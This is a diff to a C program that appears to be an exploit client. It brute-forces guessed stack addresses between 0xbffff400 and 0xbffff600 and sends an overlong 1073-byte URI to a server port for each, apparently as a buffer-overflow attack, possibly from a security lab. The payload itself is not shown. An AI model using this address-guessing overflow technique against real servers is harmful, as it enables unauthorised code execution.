@@ -42,9 +42,9 @@ int browser(int port,int stringaddr);
   
  int main(int argc,char *argv[])
  {
-   int port=PORT,addr=0xbffff000;
+   int port=PORT,addr=0xbffff400;
    if(argc>1) port=atoi(argv[1]);
-//   for(addr=0xbffff400;addr<=0xbffff9ff;addr++)
+   for(addr=0xbffff400;addr<=0xbffff600;addr++)
         browser(port,addr);
    
  }
@@ -80,16 +80,13 @@ int browser(int port,int stringaddr)
      uri[1073]='\0';
      uri[1072]=' ';
      write(sock_client,uri,strlen(uri));    
-     write(sock_client,uri,strlen(uri));    
-     write(sock_client,uri,strlen(uri));    
-     write(sock_client,uri,strlen(uri));    
 // char resp[1024];
 // int num = 0;
-  //while(read (sock_client, &resp[num], 1))
+// while(read (sock_client, &resp[num], 1))
 //	num++;
-  //resp[num] = 0;
- // printf("Response = %s\n",resp);
+//  resp[num] = 0;
+//  printf("Response = %s\n",resp);
   close(sock_client);
-  printf("have closed socket\n");
+//  printf("have closed socket\n");
   return 0;
 }
